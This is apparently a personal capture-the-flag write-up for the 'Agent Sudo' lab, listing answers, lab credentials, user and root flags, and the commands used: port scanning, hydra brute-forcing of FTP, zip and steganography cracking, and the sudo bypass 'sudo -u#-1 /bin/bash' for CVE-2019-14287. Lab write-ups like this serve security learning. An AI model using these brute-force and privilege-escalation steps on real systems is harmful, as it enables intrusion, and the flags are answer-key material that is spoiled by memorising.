---
title: "Agent Sudo"

date: 2022-12-18
url: /agent-sudo/
image: images/2022-thumbs/agent-sudo.png
categories:
  - CTF
tags:
  - CTF
draft: false
---

## Questions
1. How many open ports? `3`
2. How you redirect yourself to a secret page? `user-agent`
3. What is the agent name? `chris`
4. FTP password `crystal`
5. Zip file password `alien`
5. steg password `Area51`
6. Who is the other agent (in full name)? `james`
7. SSH password `hackerrules!`
8. What is the user flag? `b03d975e8c92a7c04146cfa7a5a313c7`
9. What is the incident of the photo called? `Roswell alien autopsy`
10. CVE number for the escalation `CVE-2019-14287`
11. What is the root flag? `b53a02f55b57d4439e3341834d70c062`
12. (Bonus) Who is Agent R? `DesKel`

---
## Notes
- IP = 10.10.182.42

### Exposed Services
```bash
21
22
80
```

### Users:Passwords
- chris:crystal
    - found chris via burp-suite and user-agent
    - found crystal via hydra
- Agent R
- Agent J - james:hackerrules!
- zip hash = alien
- To_agentR.txt = QXJlYTUx (base64) = Area51

### Vulnerabilities
- 

---
## Commands
`ping $IP`

`sudo nmap -sC -sV -oN scans/initial $IP`

`hydra -v -l chris -P /usr/local/share/wordlists/rockyou.txt 10.10.182.42 ftp`

`binwalk -e cutie.png`
`/opt/homebrew/Cellar/john-jumbo/1.9.0_1/share/john/zip2john 8702.zip > zip.hash`
`john zip.hash` = password: alien

`7z e 8702.zip`

`echo QXJlYTUx | base64 -d`

`steghide extract -sf cute-alienjpg`

`sudo -u#-1 /bin/bash`
